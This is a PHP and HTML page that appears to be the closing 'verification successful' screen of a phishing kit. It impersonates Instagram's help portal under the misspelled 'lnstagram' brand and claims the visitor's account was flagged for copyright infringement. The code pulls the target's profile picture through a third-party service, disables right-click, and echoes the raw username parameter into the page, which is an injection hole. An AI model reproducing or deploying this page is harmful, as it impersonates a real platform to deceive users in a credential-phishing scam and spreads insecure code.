<?php

ob_start();
session_start();
error_reporting(E_ALL);

set_time_limit(0);
function ara($bas, $son, $yazi)
{
    @preg_match_all('/' . preg_quote($bas, '/') .
    '(.*?)'. preg_quote($son, '/').'/i', $yazi, $m);
    return @$m[1];
}
$username = $_GET["username"];

function fotocekme($username) {
    $ch = curl_init();

    curl_setopt($ch, CURLOPT_URL,"https://www.instatakipci.com/phpCurl");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,
        "user=".$username."&productAsks=%7B%22sm_domain%22%3A%22https%3A%2F%2Fwww.instagram.com%2F%22%2C%22preview%22%3A%221%22%2C%22sm_type_id%22%3A1%2C%22link_status%22%3A0%2C%22image_way%22%3A%22%22%7D&multiOptionTake=&nextTimeline=");


    

// In real life you should use something like:
// curl_setopt($ch, CURLOPT_POSTFIELDS, 
//          http_build_query(array('postvar1' => 'value1')));

// Receive server response ...
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    $server_output = curl_exec($ch);

    curl_close ($ch);

    $data = json_decode($server_output,true);
    
    return $data['imageChange'];
}

$image_url = fotocekme($username);

$username= $_GET["username"];
?>

<html>
<head>
    <meta charset='utf-8'>
    <meta name='viewport' content='width=device-width, initial-scale=1'>
    <title>lnstagram Copyright Support @<?php echo $username?></title>
    <link href='https://maxcdn.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css' rel='stylesheet'>
    <link href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.0.3/css/font-awesome.css' rel='stylesheet'>
    <link rel="stylesheet" type="text/css" href="style.css">
    <script type='text/javascript' src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js'></script>
    <script type='text/javascript' src='https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js'></script>
    <script type='text/javascript' src='https://maxcdn.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js'></script>
</head>
<body oncontextmenu='return false' class='snippet-body'>
    
    <div class="card card0">
        <div class="d-flex flex-lg-row flex-column-reverse">
            <div class="card card1">
                <div class="row justify-content-center my-auto">
                    <div class="col-md-8 col-10 my-5">
                        <div class="row justify-content-center px-3 mb-3"> <img id="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png"> </div> 
                        
                        <center><img src="img/mail.png" alt="<?php echo $username;?>" of photo width = "125" style="border-radius:50%;margin-top:12px;"><br><br>
                            <b>Verification Succesful</b>
                            <br>
                            <strong class="yazi" style="color: #8e8e8e;"><?php echo "@".$username.","; ?></strong><br><br>
                            <label class="yazi" style="color: #8e8e8e;">Your account has been successfully verified. Thank you for caring for Instagram terms of use and conditions.</label>
                            <br> 
                            <br>
                            <br>
                            <br>
                            <font style=" color:#8e8e8e">Go to </font><a style="color : #0095f6;" href="https://www.instagram.com/<?php echo $username?>"><b>Home</a></b>
                            <div class="form-group"> 
                              
                          </div>  
                      </div>
                  </div> 
                  <style>
                    .yazi {
    font-size: 14px;
    line-height: 18px;
    margin: -3px 0 -4px;
}

                    .other{
                        margin-top:100px;
                        bottom:1px;
                        position:relative;
                        border-top:1px solid #cecece;
                        width:100%;

                    }
                </style>
                <center> <div  class="other">
                    <img src="https://marka-logo.com/wp-content/uploads/2020/04/Facebook-Logo.png" alt="fb" width="110">
                </div>
            </div>
            <div class="card card2">
                <div class="my-auto mx-md-5 px-md-5 right">
                    <h3 class="text-white">lnstagram Help Portal</h3> <small class="text-white">If you've been redirected to this page, your account has been found to be infringing on copyright. Please complete the form to verify your account.
                    </small>
                </div>
            </div> 

        </div>
    </div>
</div>
<script type='text/javascript'></script>
</body>
</html>